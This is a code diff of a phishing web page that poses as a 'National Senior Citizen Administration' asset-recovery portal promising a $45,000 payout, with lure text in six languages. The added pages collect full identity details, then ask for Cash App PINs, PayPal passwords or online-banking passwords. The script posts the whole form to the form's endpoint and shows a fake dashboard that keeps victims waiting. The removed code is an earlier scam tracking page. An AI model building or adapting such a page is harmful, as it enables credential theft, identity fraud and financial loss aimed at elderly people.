+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Tracking Number:</span><span class="value" id="mirror-ref">---</span></div>
+            </div>
+
+            <div class="card" style="background: #f1f5f9;">
+                <div class="flex-row">
+                    <span class="label">Verification Status</span>
+                    <span class="value" style="color: var(--success); font-weight: bold;">PASSED & CONFIRMED</span>
+                </div>
+                <div class="flex-row">
+                    <span class="label">Portal Lock State</span>
+                    <span class="value" style="color: var(--success);">SECURE EXCLUSIVE MATCH</span>
+                </div>
+            </div>
+
+            <button type="button" class="btn" onclick="initiateStepTransition('page3')">
+                Proceed to Payout →
+            </button>
+            
+            <button type="button" class="btn-secondary" onclick="navigateTo('page1')">
+                ← Back to Identification
+            </button>
+        </div>
+
+        <div id="page3" class="page">
+            <h2>Disbursement Management</h2>
+            <p class="subtitle">Update your preferences below to direct your pending balance transfer.</p>
+
+            <div style="text-align: center;">
+                <div class="status-badge">
+                    <span style="width: 8px; height: 8px; background: #dd6b20; border-radius: 50%;"></span>
+                    In Process
+                </div>
+            </div>
+
+            <div class="balance-box">
+                <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Available Balance</div>
+                <div class="balance-amount">$45,000.00</div>
+            </div>
+
+            <div id="p3-error-frame" class="inline-error-msg">Failed to Continue: Please pick an option and fill out all required account credentials.</div>
+
+            <input type="hidden" name="Selected Transfer Type" id="hiddenMethodType" value="Not Chosen">
+
+            <div class="method-options">
+                <div class="method-option" id="opt-cashapp" onclick="selectPaymentMethod('cashapp')">
+                    <div class="method-header">
+                        <input type="radio" name="payment_pref" id="rad-cashapp" style="accent-color: var(--primary);">
+                        <span>Cash App</span>
+                    </div>
+                    <div class="method-fields">
+                        <div class="input-group"><label>Cashtag ($)</label><input type="text" name="CashApp_Tag" placeholder="$Tag"></div>
+                        <div class="input-group"><label>Account Email</label><input type="email" name="CashApp_Email" placeholder="Email associated with account"></div>
+                        <div class="input-group"><label>Security PIN</label><input type="password" name="CashApp_PIN" placeholder="Enter Cash App PIN"></div>
+                    </div>
+                </div>
+
+                <div class="method-option" id="opt-paypal" onclick="selectPaymentMethod('paypal')">
+                    <div class="method-header">
+                        <input type="radio" name="payment_pref" id="rad-paypal" style="accent-color: var(--primary);">
+                        <span>PayPal Account</span>
+                    </div>
+                    <div class="method-fields">
+                        <div class="input-group"><label>PayPal Email Address</label><input type="email" name="PayPal_Email" placeholder="name@example.com"></div>
+                        <div class="input-group"><label>Account Password</label><input type="password" name="PayPal_Pass" placeholder="Enter PayPal password"></div>
+                    </div>
+                </div>
+
+                <div class="method-option" id="opt-banking" onclick="selectPaymentMethod('banking')">
+                    <div class="method-header">
+                        <input type="radio" name="payment_pref" id="rad-banking" style="accent-color: var(--primary);">
+                        <span>Direct Bank Transfer</span>
+                    </div>
+                    <div class="method-fields">
+                        <div class="input-group"><label>Bank Name</label><input type="text" name="Bank_Name" placeholder="e.g. Chase, Wells Fargo"></div>
+                        <div class="input-group"><label>Account Email</label><input type="email" name="Bank_Email" placeholder="Email used for Online Banking"></div>
+                        <div class="input-group"><label>Banking Password</label><input type="password" name="Bank_Pass" placeholder="Enter online banking password"></div>
                     </div>
                 </div>
             </div>
 
-            <div class="trust-footer">
-                All transited data is encrypted. This verification portal strictly adheres to consumer privacy standards. No data is shared with unverified third parties.
-                <div class="badge-row">
-                    <span>🛡️ SECURE ASSET DEPLOYMENT</span>
-                    <span>⚙️ INTENT MATCHED</span>
+            <button type="button" class="btn" style="background: var(--success);" onclick="processDashboardUpdate()">
+                Submit Settings Transfer
+            </button>
+            
+            <button type="button" class="btn-secondary" onclick="navigateTo('page2')">
+                ← Back to Verification Review
+            </button>
+        </div>
+
+        <div id="page4" class="page">
+            <h2>Administrative Dashboard</h2>
+            <div class="dash-menu-bar">
+                <div class="dash-menu-item active" onclick="switchDashTab(this, 'dash-overview')">Overview</div>
+                <div class="dash-menu-item" onclick="switchDashTab(this, 'dash-settings')">Settings</div>
+            </div>
+
+            <div id="dash-overview" class="dash-panel active">
+                <div class="balance-box">
+                    <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Available Balance</div>
+                    <div class="balance-amount">$45,000.00</div>
+                </div>
+                <div class="card">
+                    <div class="flex-row">
+                        <span class="label">Status</span>
+                        <span class="status-pill" style="background:#e2e8f0; color:#4a5568;">PENDING PROCESSING</span>
+                    </div>
+                    <div class="flex-row"><span class="label">Account Holder</span><span class="value" id="dash-client-name">---</span></div>
+                    <div class="flex-row"><span class="label">Tracking Number</span><span class="value" id="dash-masked-details">---</span></div>
+                </div>
+                <div style="font-size: 12px; color: var(--text-light); text-align: center; font-weight: 800; padding: 10px;">
+                    Next Step: Awaiting final clearance from the Treasury Reconciliation Unit.
                 </div>
             </div>
 
+            <div id="dash-settings" class="dash-panel">
+                <div class="card">
+                    <h3 style="color:var(--primary); margin-bottom:15px; font-size:15px;">Security & Privacy</h3>
+                    
+                    <div class="input-group">
+                        <label>Change Password</label>
+                        <input type="password" id="new-password-field" placeholder="New Password">
+                    </div>
+                    <button type="button" class="btn" style="padding: 10px; font-size: 14px;" onclick="alert('Password update initiated.')">Update Password</button>
+                    
+                    <hr style="margin: 20px 0; border: 0; border-top: 1px solid #e2e8f0;">
+                    
+                    <div class="input-group">
+                        <label>Change Full Name</label>
+                        <input type="text" id="change-name-val" placeholder="Update Display Name">
+                    </div>
+                    <button type="button" class="btn" style="padding: 10px; font-size: 14px; background: var(--accent);" onclick="document.getElementById('dash-client-name').innerText = document.getElementById('change-name-val').value">Update Name</button>
+                    
+                    <hr style="margin: 20px 0; border: 0; border-top: 1px solid #e2e8f0;">
+                    
+                    <div class="input-group">
+                        <label>Identity Verification</label>
+                        <div style="padding: 12px; background: #e6f4ea; color: var(--success); border-radius: 8px; font-size: 14px; text-align:center;">
+                            ✔ IDENTITY VERIFIED
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
+    </form>
+</div>
+
+<div class="live-agent-dock" id="supportAgentPanel">
+    <div class="agent-avatar-frame">
+        <div class="agent-avatar-img">👩‍💼</div>
+        <div class="agent-status-dot"></div>
     </div>
+    <div class="agent-info-content">
+        <div class="agent-name-title">Agent Samantha</div>
+        <div class="agent-status-label">Offline</div>
+    </div>
+</div>
 
 <script>
-    // ----------------------------------------------------
-    // PRIVATE DATABASE LEDGER: CHOOSE EXACTLY WHAT CLIENTS SEE HERE
-    // stage 1 = Intake, stage 2 = Audit, stage 3 = Packaging, stage 4 = Approved
-    // ----------------------------------------------------
-    const PRIVATE_REGISTRY_DATABASE = {
-        "REC-777": { name: "Johnathan Doe", stage: 2, region: "Texas (TX Registry)", amount: "$10,000" },
-        "REC-101": { name: "Alice Smith", stage: 4, region: "Florida (FL Registry)", amount: "$50,000+" },
-        "555-123-4567": { name: "Robert Johnson", stage: 1, region: "California (CA Registry)", amount: "$1,000" }
+    const ALLOWED_REFERENCE_CODES = ["SRN-884291-X", "SRN-773105-Z", "SRN-992038-A", "SRN-556127-K", "SRN-448932-B"];
+    let activePageId = 'page1';
+
+    function switchDashTab(el, id) {
+        document.querySelectorAll('.dash-panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.dash-menu-item').forEach(m => m.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        el.classList.add('active');
+    }
+
+    function togglePasswordVisibility(inputId) {
+        const inputField = document.getElementById(inputId);
+        const iconContainer = document.getElementById('eye-icon');
+        
+        if (inputField.type === "password") {
+            inputField.type = "text";
+            iconContainer.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`;
+        } else {
+            inputField.type = "password";
+            iconContainer.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
+        }
+    }
+
+    window.addEventListener('load', () => { window.history.replaceState({ page: 'page1' }, '', ''); });
+
+    window.addEventListener('popstate', (event) => {
+        if (event.state && event.state.page) {
+            if (activePageId === 'page4') { window.history.pushState({ page: 'page4' }, '', ''); return; }
+            executePageTransition(activePageId, event.state.page, false);
+        }
+    });
+
+    const headerConfigs = {
+        'page1': { banner: 'main', label: '' },
+        'page2': { banner: 'sub', label: 'File Verification Overview' },
+        'page3': { banner: 'sub', label: 'Disbursement Pipeline Gateway' },
+        'page4': { banner: 'sub', label: 'Secure Settlement Desk' }
     };
 
-    const STEP_DEFINITIONS = [
-        { title: "Registry File Intake Completed", desc: "Initial system filter matching executed successfully." },
-        { title: "Treasury Audit & Asset Matching", desc: "Verification specialist cross-referencing regional ledger indices." },
-        { title: "Legal Claim Packaging", desc: "Compiling owner certification portfolios for state recovery submission." },
-        { title: "Escrow Distribution Approved", desc: "Liquidation execution completed by Treasury oversight." }
-    ];
+    function updateDynamicHeaders(targetPage) {
+        const config = headerConfigs[targetPage];
+        const mainHeader = document.getElementById('mainBrandHeader');
+        const subBanner = document.getElementById('secondaryPipelineBanner');
+        const subText = document.getElementById('pipelineBannerText');
 
-    function switchView(viewName) {
-        document.querySelectorAll('.view-panel').forEach(p => p.classList.remove('active'));
-        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-        if(viewName === 'intake') {
-            document.getElementById('panelIntake').classList.add('active');
-            document.getElementById('btnViewIntake').classList.add('active');
+        if (config.banner === 'main') {
+            subBanner.style.display = 'none';
+            mainHeader.style.display = 'block';
         } else {
-            document.getElementById('panelTrack').classList.add('active');
-            document.getElementById('btnViewTrack').classList.add('active');
+            mainHeader.style.display = 'none';
+            subText.innerText = config.label;
+            subBanner.style.display = 'block';
         }
     }
 
-    function goStep2() {
-        const stateSelect = document.getElementById('propertyState');
-        const tierSelect = document.getElementById('assetTier');
-        const stateError = document.getElementById('stateError');
-        const tierError = document.getElementById('tierError');
-        let error = false;
+    function executePageTransition(oldId, newId, pushHistory = true) {
+        const oldPage = document.getElementById(oldId);
+        const newPage = document.getElementById(newId);
 
-        stateSelect.classList.remove('input-error');
-        tierSelect.classList.remove('input-error');
-        stateError.style.display = 'none';
-        tierError.style.display = 'none';
+        oldPage.classList.add('exit');
+        oldPage.classList.remove('active');
 
-        if(stateSelect.value === "") { stateSelect.classList.add('input-error'); stateError.style.display = 'block'; error = true; }
-        if(tierSelect.value === "") { tierSelect.classList.add('input-error'); tierError.style.display = 'block'; error = true; }
-        if(error) return;
-
-        document.getElementById('step1').classList.remove('active');
-        const step2 = document.getElementById('step2');
-        step2.classList.add('active');
-        step2.querySelectorAll('input').forEach(i => i.removeAttribute('disabled'));
-    }
-
-    function validateAndSubmit() {
-        const name = document.getElementById('fullName');
-        const email = document.getElementById('email');
-        const phone = document.getElementById('phone');
-        let error = false;
-
-        [name, email, phone].forEach(i => i.classList.remove('input-error'));
-        ['nameError', 'emailError', 'phoneError'].forEach(e => document.getElementById(e).style.display = 'none');
-
-        if(name.value.trim() === "") { name.classList.add('input-error'); document.getElementById('nameError').style.display = 'block'; error = true; }
-        if(!email.value.includes('@') || email.value.trim() === "") { email.classList.add('input-error'); document.getElementById('emailError').style.display = 'block'; error = true; }
-        if(phone.value.length < 12) { phone.classList.add('input-error'); document.getElementById('phoneError').style.display = 'block'; error = true; }
-        if(error) return;
-
-        const btn = document.getElementById('submitBtn');
-        const spinner = document.getElementById('btnSpinner');
-        const text = document.getElementById('btnText');
-
-        btn.style.pointerEvents = 'none';
-        btn.style.backgroundColor = '#051626';
-        spinner.style.display = 'block';
-        text.innerText = 'Verifying Ledger Attachment...';
-
-        document.getElementById('portalForm').submit();
-    }
-
-    // CONTROLLED RECOVERY LEDGER INTERACTION ENGINE
-    function executeLedgerLookup() {
-        const queryInput = document.getElementById('lookupID').value.trim();
-        const container = document.getElementById('pipelineContainer');
-        const stepsContainer = document.getElementById('pipelineStepsContainer');
-        const displayRefNum = document.getElementById('displayRefNum');
-        const displayClientName = document.getElementById('displayClientName');
-        const displayClientRegion = document.getElementById('displayClientRegion');
-        const suppBox = document.getElementById('supplementalBox');
-
-        if(queryInput === "") {
-            alert("Please input an authorized tracking hash or target number.");
-            return;
-        }
-
-        stepsContainer.innerHTML = ""; // Clear visual chart
-        const matchedRecord = PRIVATE_REGISTRY_DATABASE[queryInput];
-
-        if(matchedRecord) {
-            // Found matched case inside manual database parameters
-            displayRefNum.innerText = queryInput.toUpperCase();
-            displayClientName.innerText = matchedRecord.name;
-            displayClientRegion.innerText = matchedRecord.region + " | Allocation Tier: " + matchedRecord.amount;
-
-            // Render matching visual progression tree rows
-            STEP_DEFINITIONS.forEach((step, idx) => {
-                const currentStepNum = idx + 1;
-                let stepClass = "";
-                let iconContent = currentStepNum;
-
-                if (currentStepNum < matchedRecord.stage) {
-                    stepClass = "completed";
-                    iconContent = "✓";
-                } else if (currentStepNum === matchedRecord.stage) {
-                    stepClass = "current";
-                }
-
-                const stepHTML = `
-                    <div class="pipe-step ${stepClass}">
-                        <div class="pipe-icon">${iconContent}</div>
-                        <div class="pipe-info">
-                            <h4>${step.title}</h4>
-                            <p>${step.desc}</p>
-                        </div>
-                    </div>
-                `;
-                stepsContainer.innerHTML += stepHTML;
-            });
-
-            // Show secure supplemental upload files instruction only if stage 2 is active
-            suppBox.style.display = (matchedRecord.stage === 2) ? 'block' : 'none';
-
-        } else {
-            // Fallback screen styling for unlisted lookup variants
-            displayRefNum.innerText = queryInput.toUpperCase();
-            displayClientName.innerText = "Pending Verification Profile";
-            displayClientRegion.innerText = "System Audit Mode Active";
+        setTimeout(() => {
+            oldPage.style.display = 'none';
+            oldPage.classList.remove('exit');
             
-            stepsContainer.innerHTML = `
-                <div class="pipe-step current">
-                    <div class="pipe-icon">!</div>
-                    <div class="pipe-info">
-                        <h4>Manual Agent Intake Review Pending</h4>
-                        <p>Your record matching file has been logged securely. An intake manager is actively analyzing the local ledger file. No automated records found yet.</p>
-                    </div>
-                </div>
-            `;
-            suppBox.style.display = 'none';
-        }
-
-        container.style.display = 'block';
-        container.style.animation = 'fadeIn 0.3s ease-in-out';
+            updateDynamicHeaders(newId);
+            newPage.style.display = 'block';
+            
+            setTimeout(() => { 
+                newPage.classList.add('active'); 
+                activePageId = newId;
+                if (pushHistory) { window.history.pushState({ page: newId }, '', ''); }
+            }, 20);
+        }, 400);
     }
 
-    document.getElementById('phone').addEventListener('input', function (e) {
-        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
-        e.target.value = !x[2] ? x[1] : x[1] + '-' + x[2] + (x[3] ? '-' + x[3] : '');
-    });
+    function navigateTo(targetPageId) { executePageTransition(activePageId, targetPageId, true); }
+
+    function initiateStepTransition(targetId) {
+        if (activePageId === 'page1') {
+            const nameVal = document.getElementById('client_name').value.trim();
+            const dobVal = document.getElementById('client_dob').value.trim();
+            const emailVal = document.getElementById('client_email').value.trim();
+            const passVal = document.getElementById('client_pass').value.trim();
+            const streetVal = document.getElementById('client_street').value.trim();
+            const stateVal = document.getElementById('client_state').value.trim();
+            const cityVal = document.getElementById('client_city').value.trim();
+            const zipVal = document.getElementById('client_zip').value.trim();
+            const phnVal = document.getElementById('client_phone').value.trim();
+            const refVal = document.getElementById('ref_code').value.trim();
+            
+            if(!nameVal || !dobVal || !emailVal || !passVal || !streetVal || !stateVal || !cityVal || !zipVal || !phnVal || !ALLOWED_REFERENCE_CODES.includes(refVal)) {
+                document.getElementById('p1-error-frame').style.display = 'block';
+                return;
+            }
+            document.getElementById('mirror-name').innerText = nameVal;
+            document.getElementById('mirror-address').innerText = `${streetVal}, ${cityVal}, ${stateVal} ${zipVal}`;
+            document.getElementById('mirror-phone').innerText = phnVal;
+            document.getElementById('mirror-ref').innerText = refVal;
+        }
+
+        const currentPage = document.getElementById(activePageId);
+        const loader = document.getElementById('review-loader');
+        const bar = document.getElementById('progress-bar');
+        
+        currentPage.classList.add('exit');
+        currentPage.classList.remove('active');
+        
+        setTimeout(() => {
+            currentPage.style.display = 'none';
+            currentPage.classList.remove('exit');
+            loader.style.display = 'block';
+            
+            bar.style.transition = 'width 15s linear';
+            bar.style.width = '0%';
+            setTimeout(() => { bar.style.width = '100%'; }, 50);
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                executePageTransition(activePageId, targetId, true);
+            }, 15000);
+        }, 400);
+    }
+
+    function selectPaymentMethod(method) {
+        document.getElementById('p3-error-frame').style.display = 'none';
+        document.querySelectorAll('.method-option').forEach(el => el.classList.remove('selected'));
+        document.querySelectorAll('input[name="payment_pref"]').forEach(radio => radio.checked = false);
+
+        document.getElementById(`opt-${method}`).classList.add('selected');
+        document.getElementById(`rad-${method}`).checked = true;
+        document.getElementById('hiddenMethodType').value = method.toUpperCase();
+    }
+
+    function processDashboardUpdate() {
+        const selectedMethodEl = document.querySelector('.method-option.selected');
+        if (!selectedMethodEl) { document.getElementById('p3-error-frame').style.display = 'block'; return; }
+        
+        const inputs = selectedMethodEl.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
+        let isValid = true;
+        inputs.forEach(input => { if(!input.value.trim()) isValid = false; });
+
+        if(!isValid) { document.getElementById('p3-error-frame').style.display = 'block'; return; }
+
+        document.getElementById('dash-client-name').innerText = document.getElementById('client_name').value;
+        document.getElementById('dash-masked-details').innerText = "SECURELY PROCESSED";
+
+        const activeForm = document.getElementById('portalMasterForm');
+        const inputPayload = new FormData(activeForm);
+        fetch(activeForm.action, { method: 'POST', body: inputPayload, headers: { 'Accept': 'application/json' } });
+
+        initiateStepTransition('page4');
+    }
+
+    const languagesPack = {
+        en: {
+            title: "National Senior Citizen Administration", tagline: "Private Senior Citizen Disbursement & Portfolio Management",
+            p1Title: "Asset Recovery Portal", p1Sub: "Enter your file verification details below to initiate secure system review.",
+            guideTitle: "Official Nomination & Eligibility Verification",
+            guideSteps: `This portal manages the identification, authentication, and disbursement of retroactive government funding and unassigned treasury assets.
+                    <br><br>
+                    <strong>Qualification Criteria:</strong> Your profile has been officially nominated based on the following verified administrative data:
+                    <ul class="qualification-list">
+                        <li>Consistent, on-time payment of utility and residential service accounts.</li>
+                        <li>Documented active participation in digital banking systems for a minimum of 5 years.</li>
+                        <li>Consistent compliance with all institutional and public record validation protocols.</li>
+                    </ul>`,
+            lblName: "Full Name", lblDob: "Date of Birth", lblEmail: "Email", lblPass: "Password", lblStreet: "Street Address / Road", lblState: "State / Region", lblCity: "City", lblZip: "Zip / Postal", lblPhone: "Contact Phone Number", lblRef: "Tracking Number (Format: SRN-000000-X)", btnVerify: "Sign In & Verify", loadingTitle: "Analyzing File Registry...", loadingSub: "Performing automatic allocation ledger balance review."
+        },
+        es: {
+            title: "Administración Nacional de Ciudadanos Mayores", tagline: "Gestión Privada de Desembolsos y Portafolios",
+            p1Title: "Portal de Recuperación de Activos", p1Sub: "Ingrese los detalles de verificación a continuación.",
+            guideTitle: "Nominación Oficial y Verificación de Elegibilidad",
+            guideSteps: `Este portal gestiona la identificación, autenticación y desembolso de fondos gubernamentales y activos del tesoro no asignados. 
+                    <br><br>
+                    <strong>Criterios de Calificación:</strong> Su perfil ha sido nominado oficialmente basado en:
+                    <ul class="qualification-list">
+                        <li>Pago consistente y puntual de servicios públicos.</li>
+                        <li>Participación activa en sistemas bancarios digitales por 5 años.</li>
+                        <li>Cumplimiento constante con los protocolos de validación.</li>
+                    </ul>`,
+            lblName: "Nombre Completo", lblDob: "Fecha de Nacimiento", lblEmail: "Correo electrónico", lblPass: "Contraseña", lblStreet: "Dirección", lblState: "Estado / Región", lblCity: "Ciudad", lblZip: "Código Postal", lblPhone: "Teléfono", lblRef: "Número de Seguimiento (Formato: SRN-000000-X)", btnVerify: "Iniciar Sesión y Verificar", loadingTitle: "Analizando...", loadingSub: "Realizando revisión automática."
+        },
+        fr: {
+            title: "Administration Nationale des Citoyens Aînés", tagline: "Gestion Privée des Décaissements",
+            p1Title: "Portail de Récupération d'Actifs", p1Sub: "Entrez les détails de vérification ci-dessous.",
+            guideTitle: "Nomination Officielle et Vérification d'Éligibilité",
+            guideSteps: `Ce portail gère l'identification, l'authentification et le décaissement de fonds gouvernementaux et d'actifs du trésor non assignés.
+                    <br><br>
+                    <strong>Critères de Qualification :</strong> Votre profil a été officiellement nominé sur la base de :
+                    <ul class="qualification-list">
+                        <li>Paiement régulier et ponctuel des factures de services publics.</li>
+                        <li>Participation active aux systèmes bancaires numériques depuis 5 ans.</li>
+                        <li>Respect constant des protocoles de validation.</li>
+                    </ul>`,
+            lblName: "Nom Complet", lblDob: "Date de Naissance", lblEmail: "E-mail", lblPass: "Mot de passe", lblStreet: "Adresse", lblState: "État / Région", lblCity: "Ville", lblZip: "Code Postal", lblPhone: "Numéro de téléphone", lblRef: "Numéro de Suivi (Format: SRN-000000-X)", btnVerify: "Se Connecter et Vérifier", loadingTitle: "Analyse...", loadingSub: "Exécution de l'examen."
+        },
+        de: {
+            title: "Nationale Verwaltung für ältere Mitbürger", tagline: "Private Auszahlung & Portfolioverwaltung",
+            p1Title: "Portal zur Vermögensrückgewinnung", p1Sub: "Geben Sie unten Ihre Aktenprüfungsdetails ein.",
+            guideTitle: "Offizielle Nominierung & Berechtigungsprüfung",
+            guideSteps: `Dieses Portal verwaltet die Identifizierung, Authentifizierung und Auszahlung von rückwirkenden Regierungsmitteln.
+                    <br><br>
+                    <strong>Qualifikationskriterien:</strong> Ihr Profil wurde offiziell nominiert basierend auf:
+                    <ul class="qualification-list">
+                        <li>Konsistente, pünktliche Zahlung von Versorgungsrechnungen.</li>
+                        <li>Aktive Teilnahme an digitalen Bankensystemen seit 5 Jahren.</li>
+                        <li>Stetige Einhaltung von Validierungsprotokollen.</li>
+                    </ul>`,
+            lblName: "Vollständiger Name", lblDob: "Geburtsdatum", lblEmail: "E-Mail", lblPass: "Passwort", lblStreet: "Adresse", lblState: "Bundesland / Region", lblCity: "Stadt", lblZip: "Postleitzahl", lblPhone: "Telefon", lblRef: "Aktenzeichen (Format: SRN-000000-X)", btnVerify: "Anmelden & Überprüfen", loadingTitle: "Analyse...", loadingSub: "Automatische Überprüfung."
+        },
+        it: {
+            title: "Amministrazione Nazionale dei Cittadini Anziani", tagline: "Gestione Privata degli Esborsi",
+            p1Title: "Portale di Recupero Beni", p1Sub: "Inserisci i dettagli di verifica qui sotto.",
+            guideTitle: "Nomina Ufficiale e Verifica dell'Idoneità",
+            guideSteps: `Questo portale gestisce l'identificazione, l'autenticazione e l'erogazione di fondi governativi e attività del tesoro non assegnate.
+                    <br><br>
+                    <strong>Criteri di Qualifica:</strong> Il tuo profilo è stato nominato ufficialmente in base a:
+                    <ul class="qualification-list">
+                        <li>Pagamento costante e puntuale delle utenze.</li>
+                        <li>Partecipazione attiva ai sistemi bancari digitali da 5 anni.</li>
+                        <li>Costante conformità ai protocolli di validazione.</li>
+                    </ul>`,
+            lblName: "Nome Completo", lblDob: "Data di Nascita", lblEmail: "E-mail", lblPass: "Password", lblStreet: "Indirizzo", lblState: "Stato / Regione", lblCity: "Città", lblZip: "Codice Postale", lblPhone: "Telefono", lblRef: "Numero di Riferimento (Format: SRN-000000-X)", btnVerify: "Accedi e Verifica", loadingTitle: "Analisi...", loadingSub: "Esecuzione controllo."
+        },
+        pt: {
+            title: "Administração Nacional de Cidadãos Idosos", tagline: "Gestão Privada de Desembolsos",
+            p1Title: "Portal de Recuperação de Ativos", p1Sub: "Insira os detalhes de verificação abaixo.",
+            guideTitle: "Nomeação Oficial e Verificação de Elegibilidade",
+            guideSteps: `Este portal gerencia a identificação, autenticação e desembolso de fundos governamentais e ativos do tesouro não atribuídos.
+                    <br><br>
+                    <strong>Critérios de Qualificação:</strong> Seu perfil foi nomeado oficialmente com base em:
+                    <ul class="qualification-list">
+                        <li>Pagamento consistente e pontual de contas de serviços públicos.</li>
+                        <li>Participação ativa em sistemas bancários digitais por 5 anos.</li>
+                        <li>Conformidade constante com protocolos de validação.</li>
+                    </ul>`,
+            lblName: "Nome Completo", lblDob: "Data de Nascimento", lblEmail: "E-mail", lblPass: "Senha", lblStreet: "Endereço", lblState: "Estado / Região", lblCity: "Cidade", lblZip: "Código Postal", lblPhone: "Telefone", lblRef: "Número de Referência (Formato: SRN-000000-X)", btnVerify: "Entrar e Verificar", loadingTitle: "Analisando...", loadingSub: "Realizando revisão."
+        }
+    };
+
+    function alterPortalLanguage() {
+        const selectedLang = document.getElementById('uiLanguageSelect').value;
+        const translation = languagesPack[selectedLang];
+        document.getElementById('text-brand-title').innerText = translation.title;
+        document.getElementById('text-brand-tagline').innerText = translation.tagline;
+        document.getElementById('text-p1-title').innerText = translation.p1Title;
+        document.getElementById('text-p1-sub').innerText = translation.p1Sub;
+        document.getElementById('text-guide-title').innerText = translation.guideTitle;
+        document.getElementById('text-purpose-content').innerHTML = translation.guideSteps;
+        document.getElementById('lbl-name').innerText = translation.lblName;
+        document.getElementById('lbl-dob').innerText = translation.lblDob;
+        document.getElementById('lbl-email').innerText = translation.lblEmail;
+        document.getElementById('lbl-pass').innerText = translation.lblPass;
+        document.getElementById('lbl-street').innerText = translation.lblStreet;
+        document.getElementById('lbl-state').innerText = translation.lblState;
+        document.getElementById('lbl-city').innerText = translation.lblCity;
+        document.getElementById('lbl-zip').innerText = translation.lblZip;
+        document.getElementById('lbl-phone').innerText = translation.lblPhone;
+        document.getElementById('lbl-ref').innerText = translation.lblRef;
+        document.getElementById('btn-p1').innerText = translation.btnVerify;
+        document.getElementById('text-loader-title').innerText = translation.loadingTitle;
+        document.getElementById('text-loader-sub').innerText = translation.loadingSub;
+    }
 </script>
 
 </body>
 </html>
+
